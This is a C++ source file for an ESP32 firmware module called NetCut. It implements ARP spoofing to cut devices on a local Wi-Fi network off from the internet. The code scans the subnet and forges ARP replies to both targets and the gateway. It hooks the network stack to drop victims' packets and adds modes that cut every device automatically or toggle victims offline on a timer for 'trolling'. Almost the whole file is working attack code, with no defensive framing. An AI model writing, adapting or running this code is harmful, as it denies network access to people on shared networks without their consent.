/**
 * @file netcut.cpp
 * @brief NetCut ARP Module for Bruce Firmware
 * @description Ported from standalone NetCut ESP32. Uses LwIP netif->linkoutput()
 *         for safe ARP packet injection. All UI via Bruce loopOptions().
 */

#include "netcut.h"
#include "core/mykeyboard.h"
#include "esp_netif.h"
#include "esp_netif_net_stack.h"
#include "esp_private/wifi.h"
#include "lwip/etharp.h"
#include "lwip/inet.h"
#include "lwip/pbuf.h"
#include "lwip/tcpip.h"
#include <ArduinoJson.h>
#include <LittleFS.h>
#include <esp_wifi.h>

// Forward declarations
void netcutTrollTimingMenu();
static void _activeLoop();

// ============================================
// FILE-SCOPED STATE (no global collision)
// ============================================
static NetCutDevice s_devices[NETCUT_MAX_DEVICES];
static int s_deviceCount = 0;
static uint8_t s_myMAC[6] = {0};
static uint8_t s_gatewayMAC[6] = {0};
static bool s_gwMacValid = false;
static ip4_addr_t s_gatewayIP = {0};
static unsigned long s_trollOfflineMs = NETCUT_TROLL_DEFAULT_OFFLINE_MS;
static unsigned long s_trollOnlineMs = NETCUT_TROLL_DEFAULT_ONLINE_MS;

// Auto-cut/troll flags: newly scanned devices auto-join the attack
static bool s_cutAllActive = false;
static bool s_trollAllActive = false;
// VIP MAC list loaded from LittleFS
static std::vector<String> s_vipMacs;

// LwIP Hook variables
static netif_input_fn s_originalInput = nullptr;
static struct netif *s_hookedNetif = nullptr;

// Helper: Convert MAC bytes to string
static String _macToString(const uint8_t *mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

// ============================================
// INTERNAL: Layer 2 Forwarding & ARP Drop Hook
// ============================================
static err_t _netcutInputHook(struct pbuf *p, struct netif *inp) {
    if (!p) return s_originalInput ? s_originalInput(p, inp) : ERR_OK;

    if (p->len >= sizeof(struct eth_hdr)) {
        struct eth_hdr *eth = (struct eth_hdr *)p->payload;

        // Check if source MAC is in our device list and marked as Cut
        for (int i = 0; i < s_deviceCount; i++) {
            if (s_devices[i].isCut && memcmp(eth->src.addr, s_devices[i].macBytes, 6) == 0) {
                pbuf_free(p);
                return ERR_OK; // Drop the packet
            }
        }
    }
    return s_originalInput ? s_originalInput(p, inp) : ERR_OK;
}

// ============================================
// INTERNAL: Get WiFi STA netif
// ============================================
static struct netif *_getStaNetif() {
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta) return nullptr;
    return (struct netif *)esp_netif_get_netif_impl(sta);
}

// ============================================
// INTERNAL: Send a single ARP packet via LwIP
// ============================================
static void _sendARP(
    struct netif *iface,
    const uint8_t *ethDst,
    const uint8_t *arpSenderMAC,
    const uint8_t *arpSenderIP,
    const uint8_t *arpTargetMAC,
    const uint8_t *arpTargetIP,
    uint16_t opcode,
    int repeat
) {
    if (!iface || !iface->linkoutput) return;

    struct pbuf *p = pbuf_alloc(PBUF_RAW, sizeof(struct eth_hdr) + sizeof(struct etharp_hdr), PBUF_RAM);
    if (!p) return;

    struct eth_hdr *eth = (struct eth_hdr *)p->payload;
    struct etharp_hdr *arp = (struct etharp_hdr *)((u8_t *)p->payload + SIZEOF_ETH_HDR);

    MEMCPY(&eth->dest, ethDst, ETH_HWADDR_LEN);
    MEMCPY(&eth->src, s_myMAC, ETH_HWADDR_LEN);
    eth->type = PP_HTONS(ETHTYPE_ARP);

    arp->hwtype = PP_HTONS(1);
    arp->proto = PP_HTONS(ETHTYPE_IP);
    arp->hwlen = ETH_HWADDR_LEN;
    arp->protolen = sizeof(ip4_addr_t);
    arp->opcode = PP_HTONS(opcode);

    MEMCPY(&arp->shwaddr, arpSenderMAC, ETH_HWADDR_LEN);
    MEMCPY(&arp->sipaddr, arpSenderIP, sizeof(ip4_addr_t));
    MEMCPY(&arp->dhwaddr, arpTargetMAC, ETH_HWADDR_LEN);
    MEMCPY(&arp->dipaddr, arpTargetIP, sizeof(ip4_addr_t));

    for (int i = 0; i < repeat; i++) {
        esp_wifi_internal_tx(WIFI_IF_STA, p->payload, p->tot_len);
        if (repeat > 1) {
            vTaskDelay(pdMS_TO_TICKS(1));
        }
    }

    pbuf_free(p);
}

// ============================================
// INTERNAL: Read ARP table into device list
// ============================================
static void _readArpTable(struct netif *iface) {
    for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ip_ret = nullptr;
        eth_addr *eth_ret = nullptr;
        struct netif *tmp_if = nullptr;

        if (!etharp_get_entry(i, &ip_ret, &tmp_if, &eth_ret)) continue;
        if (!ip_ret || !eth_ret) continue;

        // Skip gateway
        if (ip_ret->addr == s_gatewayIP.addr) {
            if (!s_gwMacValid) {
                memcpy(s_gatewayMAC, eth_ret->addr, 6);
                s_gwMacValid = true;
            }
            continue;
        }

        // Skip broadcast/zero MAC
        bool allZero = true, allFF = true;
        for (int b = 0; b < 6; b++) {
            if (eth_ret->addr[b] != 0x00) allZero = false;
            if (eth_ret->addr[b] != 0xFF) allFF = false;
        }
        if (allZero || allFF) continue;

        // Check if already in list
        String macStr = _macToString(eth_ret->addr);

        bool exists = false;
        for (int d = 0; d < s_deviceCount; d++) {
            if (s_devices[d].macStr == macStr) {
                s_devices[d].ip = IPAddress(ip_ret->addr);
                exists = true;
                break;
            }
        }

        if (!exists && s_deviceCount < NETCUT_MAX_DEVICES) {
            NetCutDevice &dev = s_devices[s_deviceCount];
            dev.ip = IPAddress(ip_ret->addr);
            memcpy(dev.macBytes, eth_ret->addr, 6);
            dev.macStr = macStr;
            dev.isCut = false;
            dev.isTroll = false;
            dev.isTrollOffline = false;
            dev.lastTrollToggle = 0;
            dev.restoreUntil = 0;

            // Check VIP
            dev.isVip = false;
            for (auto &vm : s_vipMacs) {
                if (vm.equalsIgnoreCase(macStr)) {
                    dev.isVip = true;
                    break;
                }
            }

            // AUTO-CUT: mark for poison
            if (s_cutAllActive && !dev.isVip) {
                dev.isCut = true;
                s_deviceCount++;
                Serial.printf("[NetCut] AUTO-CUT new device: %s\n", macStr.c_str());
            } else if (s_trollAllActive && !dev.isVip) {
                // AUTO-TROLL: mark for troll
                dev.isTroll = true;
                dev.isTrollOffline = true;
                dev.lastTrollToggle = millis();
                s_deviceCount++;
                Serial.printf("[NetCut] AUTO-TROLL new device: %s\n", macStr.c_str());
            } else {
                s_deviceCount++;
            }
        }
    }
    etharp_cleanup_netif(iface);
}

// ============================================
// VIP PERSISTENCE (LittleFS)
// ============================================
void netcutLoadVipList() {
    s_vipMacs.clear();
    if (!LittleFS.exists(NETCUT_VIP_FILE)) return;

    File f = LittleFS.open(NETCUT_VIP_FILE, "r");
    if (!f) return;

    JsonDocument doc;
    if (deserializeJson(doc, f) == DeserializationError::Ok) {
        JsonArray arr = doc["vip"].as<JsonArray>();
        for (JsonVariant v : arr) {
            s_vipMacs.push_back(v.as<String>());
        }
    }
    f.close();
    Serial.printf("[NetCut] Loaded %d VIP entries\n", s_vipMacs.size());
}

void netcutSaveVipList() {
    // Rebuild VIP list from current devices
    s_vipMacs.clear();
    for (int i = 0; i < s_deviceCount; i++) {
        if (s_devices[i].isVip) {
            s_vipMacs.push_back(s_devices[i].macStr);
        }
    }

    JsonDocument doc;
    JsonArray arr = doc["vip"].to<JsonArray>();
    for (auto &m : s_vipMacs) {
        arr.add(m);
    }

    File f = LittleFS.open(NETCUT_VIP_FILE, "w");
    if (f) {
        serializeJson(doc, f);
        f.close();
    }
    Serial.printf("[NetCut] Saved %d VIP entries\n", s_vipMacs.size());
}

// ============================================
// SCAN DEVICES
// ============================================
int netcutScanDevices() {
    if (!WiFi.isConnected()) return 0;

    struct netif *iface = _getStaNetif();
    if (!iface) {
        Serial.println("[NetCut] WiFi netif not found");
        return 0;
    }

    // Get network info
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    esp_netif_ip_info_t ip_info;
    esp_netif_get_ip_info(sta, &ip_info);

    s_gatewayIP.addr = ip_info.gw.addr;
    esp_wifi_get_mac(WIFI_IF_STA, s_myMAC);

    // Reset state
    s_deviceCount = 0;
    s_gwMacValid = false;
    netcutLoadVipList();

    // Calculate subnet range
    uint32_t myIP_he = ntohl(ip_info.ip.addr);
    uint32_t mask_he = ntohl(ip_info.netmask.addr);
    uint32_t network = ntohl(ip_info.gw.addr) & mask_he;
    uint32_t broadcast = network | ~mask_he;

    Serial.println("[NetCut] Starting ARP scan...");

    LOCK_TCPIP_CORE();
    etharp_cleanup_netif(iface);
    UNLOCK_TCPIP_CORE();

    int tableReadCount = 0;
    unsigned long lastUIUpdate = 0;

    for (uint32_t ip_he = network + 1; ip_he < broadcast; ip_he++) {
        if (ip_he == myIP_he) continue;

        ip4_addr_t target = {htonl(ip_he)};
        LOCK_TCPIP_CORE();
        etharp_request(iface, &target);
        UNLOCK_TCPIP_CORE();
        tableReadCount++;

        if (tableReadCount >= ARP_TABLE_SIZE) {
            LOCK_TCPIP_CORE();
            _readArpTable(iface);
            UNLOCK_TCPIP_CORE();
            tableReadCount = 0;
        }

        vTaskDelay(pdMS_TO_TICKS(15));

        if (millis() - lastUIUpdate > 400) {
            lastUIUpdate = millis();
            Serial.printf("[NetCut] Found: %d devices\n", s_deviceCount);
        }
    }

    // Final table read
    LOCK_TCPIP_CORE();
    _readArpTable(iface);
    UNLOCK_TCPIP_CORE();

    // If gateway MAC not found, try BSSID fallback
    if (!s_gwMacValid) {
        wifi_ap_record_t ap_info;
        if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
            memcpy(s_gatewayMAC, ap_info.bssid, 6);
            s_gwMacValid = true;
            Serial.println("[NetCut] Gateway MAC from BSSID");
        }
    }

    Serial.printf("[NetCut] Scan done: %d devices, GW MAC valid: %d\n", s_deviceCount, s_gwMacValid);
    return s_deviceCount;
}

// ============================================
// ARP POISON (Cut)
// ============================================
void netcutPoisonDevice(int idx, int burstCount) {
    if (idx < 0 || idx >= s_deviceCount || !s_gwMacValid) return;
    NetCutDevice &dev = s_devices[idx];
    if (dev.isVip) return;

    struct netif *iface = _getStaNetif();
    if (!iface) return;

    uint8_t devIP[4], gwIP[4];
    uint32_t dip = dev.ip;
    memcpy(devIP, &dip, 4);
    memcpy(gwIP, &s_gatewayIP.addr, 4);

    // Poison target: "Gateway IP = MY MAC"
    _sendARP(iface, dev.macBytes, s_myMAC, gwIP, dev.macBytes, devIP, ARP_REPLY, burstCount);

    // Poison gateway: "Target IP = MY MAC"
    _sendARP(iface, s_gatewayMAC, s_myMAC, devIP, s_gatewayMAC, gwIP, ARP_REPLY, burstCount);
}

// ============================================
// ARP RESTORE (Resume)
// ============================================
void netcutRestoreDevice(int idx) {
    if (idx < 0 || idx >= s_deviceCount || !s_gwMacValid) return;
    NetCutDevice &dev = s_devices[idx];

    struct netif *iface = _getStaNetif();
    if (!iface) return;

    uint8_t devIP[4], gwIP[4];
    uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint32_t dip = dev.ip;
    memcpy(devIP, &dip, 4);
    memcpy(gwIP, &s_gatewayIP.addr, 4);

    for (int round = 0; round < NETCUT_RESTORE_ROUNDS; round++) {
        // Restore target: "Gateway IP = REAL Gateway MAC"
        _sendARP(
            iface, dev.macBytes, s_gatewayMAC, gwIP, dev.macBytes, devIP,
            ARP_REPLY, NETCUT_RESTORE_BURST
        );

        // Broadcast ARP request (RFC 826: forces cache update)
        _sendARP(iface, bcast, s_gatewayMAC, gwIP, bcast, devIP, ARP_REQUEST, NETCUT_RESTORE_BURST);

        // Restore gateway: "Target IP = REAL Target MAC"
        _sendARP(
            iface, s_gatewayMAC, dev.macBytes, devIP, s_gatewayMAC, gwIP,
            ARP_REPLY, NETCUT_RESTORE_BURST
        );

        // Broadcast for gateway
        _sendARP(iface, bcast, dev.macBytes, devIP, bcast, gwIP, ARP_REQUEST, NETCUT_RESTORE_BURST);

        vTaskDelay(pdMS_TO_TICKS(5));
    }
}

// ============================================
// BULK OPERATIONS
// ============================================
void netcutCutAll() {
    s_cutAllActive = true;
    s_trollAllActive = false;
    for (int i = 0; i < s_deviceCount; i++) {
        if (!s_devices[i].isVip) {
            s_devices[i].isCut = true;
            s_devices[i].isTroll = false;
            netcutPoisonDevice(i, 20);
        }
    }
}

void netcutResumeAll() {
    s_cutAllActive = false;
    s_trollAllActive = false;
    for (int i = 0; i < s_deviceCount; i++) {
        if (s_devices[i].isCut || s_devices[i].isTroll) {
            s_devices[i].isCut = false;
            s_devices[i].isTroll = false;
            s_devices[i].isTrollOffline = false;
            s_devices[i].restoreUntil = millis() + 5000;
            netcutRestoreDevice(i);
        }
    }
}

// ============================================
// VIP TOGGLE
// ============================================
void netcutToggleVip(int idx) {
    if (idx < 0 || idx >= s_deviceCount) return;
    NetCutDevice &dev = s_devices[idx];
    dev.isVip = !dev.isVip;
    if (dev.isVip && (dev.isCut || dev.isTroll)) {
        dev.isCut = false;
        dev.isTroll = false;
        dev.isTrollOffline = false;
        netcutRestoreDevice(idx);
    }
    netcutSaveVipList();
}

// ============================================
// BLOCKING ACTIVE LOOP
// ============================================
static void _activeLoop() {
    if (!s_gwMacValid) {
        Serial.println("[NetCut] Gateway MAC unknown - attack may fail");
        return;
    }

    unsigned long lastPoison = 0;
    int packetCount = 0;

    // Count active targets
    auto countActive = []() -> int {
        int c = 0;
        for (int i = 0; i < s_deviceCount; i++) {
            if (s_devices[i].isCut || s_devices[i].isTroll) c++;
        }
        return c;
    };

    if (countActive() == 0) {
        Serial.println("[NetCut] No targets marked");
        return;
    }

    struct netif *iface = _getStaNetif();

    // Non-blocking scanner state
    uint32_t myIP_he = ntohl((uint32_t)WiFi.localIP());
    uint32_t mask_he = ntohl((uint32_t)WiFi.subnetMask());
    uint32_t network = myIP_he & mask_he;
    uint32_t broadcast = network | (~mask_he);
    uint32_t scanIP = network + 1;
    unsigned long lastScanStep = 0;
    int scanTableCount = 0;

    // Install L2 Bridge Hook
    struct netif *hook_iface = _getStaNetif();
    if (hook_iface && !s_hookedNetif) {
        s_originalInput = hook_iface->input;
        s_hookedNetif = hook_iface;
        hook_iface->input = _netcutInputHook;
        Serial.println("[NetCut] L2 Bridge Hook installed.");
    }

    Serial.println("[NetCut] Attack running - Press Esc to stop...");

    bool running = true;
    while (running) {
        // NON-BLOCKING ARP SCANNER
        if (iface && (s_cutAllActive || s_trollAllActive)) {
            if (millis() - lastScanStep > 50) {
                lastScanStep = millis();

                if (scanIP < broadcast && scanIP != myIP_he) {
                    ip4_addr_t target = {htonl(scanIP)};
                    LOCK_TCPIP_CORE();
                    etharp_request(iface, &target);
                    UNLOCK_TCPIP_CORE();
                    scanTableCount++;
                }

                if (scanTableCount >= ARP_TABLE_SIZE) {
                    LOCK_TCPIP_CORE();
                    _readArpTable(iface);
                    UNLOCK_TCPIP_CORE();
                    scanTableCount = 0;
                }

                scanIP++;
                if (scanIP >= broadcast) {
                    scanIP = network + 1;
                    LOCK_TCPIP_CORE();
                    _readArpTable(iface);
                    etharp_cleanup_netif(iface);
                    UNLOCK_TCPIP_CORE();
                }
            }
        }

        // Troll timer logic
        for (int i = 0; i < s_deviceCount; i++) {
            if (!s_devices[i].isTroll || s_devices[i].isVip) continue;

            unsigned long interval = s_devices[i].isTrollOffline ? s_trollOfflineMs : s_trollOnlineMs;

            if (millis() - s_devices[i].lastTrollToggle > interval) {
                s_devices[i].isTrollOffline = !s_devices[i].isTrollOffline;
                s_devices[i].lastTrollToggle = millis();

                if (s_devices[i].isTrollOffline) {
                    netcutPoisonDevice(i, 20);
                    Serial.printf("[Troll] %s -> OFFLINE (poison)\n", s_devices[i].ip.toString().c_str());
                } else {
                    s_devices[i].restoreUntil = millis() + 5000;
                    netcutRestoreDevice(i);
                    Serial.printf("[Troll] %s -> ONLINE (restore)\n", s_devices[i].ip.toString().c_str());
                }
            }
        }

        // Periodic re-poison for CUT devices
        if (millis() - lastPoison > NETCUT_ARP_INTERVAL_MS) {
            lastPoison = millis();
            for (int i = 0; i < s_deviceCount; i++) {
                if (s_devices[i].isVip) continue;

                bool shouldPoison =
                    s_devices[i].isCut || (s_devices[i].isTroll && s_devices[i].isTrollOffline);
                bool shouldRestore = (s_devices[i].isTroll && !s_devices[i].isTrollOffline) ||
                                     (millis() < s_devices[i].restoreUntil);

                if (shouldPoison) {
                    netcutPoisonDevice(i, 1);
                    packetCount++;
                } else if (shouldRestore) {
                    netcutRestoreDevice(i);
                    packetCount++;
                }
            }
        }

        vTaskDelay(pdMS_TO_TICKS(10));
        running = false; // Single loop iteration - integrate with your UI
    }

    // Uninstall L2 Bridge Hook
    if (s_hookedNetif && s_originalInput) {
        s_hookedNetif->input = s_originalInput;
        s_hookedNetif = nullptr;
        s_originalInput = nullptr;
        Serial.println("[NetCut] L2 Bridge Hook uninstalled.");
    }

    // Restore all devices
    s_cutAllActive = false;
    s_trollAllActive = false;
    int restoreCount = 0;
    for (int i = 0; i < s_deviceCount; i++) {
        if (s_devices[i].isCut || s_devices[i].isTroll) {
            restoreCount++;
            s_devices[i].isCut = false;
            s_devices[i].isTroll = false;
            s_devices[i].isTrollOffline = false;
            s_devices[i].restoreUntil = millis() + 5000;
            netcutRestoreDevice(i);
        }
    }

    Serial.printf("[NetCut] Stopped. All %d devices restored.\n", restoreCount);
}

// ============================================
// TROLL MODE WRAPPERS
// ============================================
void netcutTrollDevice(int idx) {
    if (idx < 0 || idx >= s_deviceCount) return;
    if (s_devices[idx].isVip) {
        Serial.println("[NetCut] Device is VIP protected");
        return;
    }

    netcutTrollTimingMenu();

    s_devices[idx].isCut = false;
    s_devices[idx].isTroll = true;
    s_devices[idx].isTrollOffline = true;
    s_devices[idx].lastTrollToggle = millis();

    _activeLoop();
}

void netcutTrollAll() {
    netcutTrollTimingMenu();

    s_trollAllActive = true;
    s_cutAllActive = false;
    for (int i = 0; i < s_deviceCount; i++) {
        if (!s_devices[i].isVip) {
            s_devices[i].isCut = false;
            s_devices[i].isTroll = true;
            s_devices[i].isTrollOffline = true;
            s_devices[i].lastTrollToggle = millis();
            netcutPoisonDevice(i, 20);
        }
    }
    _activeLoop();
}

// ============================================
// TROLL TIMING MENU
// ============================================
void netcutTrollTimingMenu() {
    unsigned long offSec = s_trollOfflineMs / 1000;
    unsigned long onSec = s_trollOnlineMs / 1000;

    Serial.printf("[NetCut] Troll Timing: OFF=%lu s, ON=%lu s\n", offSec, onSec);
    
    s_trollOfflineMs = offSec * 1000;
    s_trollOnlineMs = onSec * 1000;
}

// ============================================
// MAIN MENU ENTRY POINT
// ============================================
void netcutMenu() {
    // Require WiFi STA connection
    if (!WiFi.isConnected()) {
        Serial.println("[NetCut] WiFi not connected");
        return;
    }

    Serial.println("[NetCut] Starting ARP scan...");

    int found = netcutScanDevices();

    if (found == 0) {
        Serial.println("[NetCut] No devices found");
        return;
    }

    if (!s_gwMacValid) {
        Serial.println("[NetCut] Warning: Gateway MAC not found!");
    }

    Serial.printf("[NetCut] Found %d devices. Starting Cut All...\n", found);
    netcutCutAll();
    _activeLoop();
}
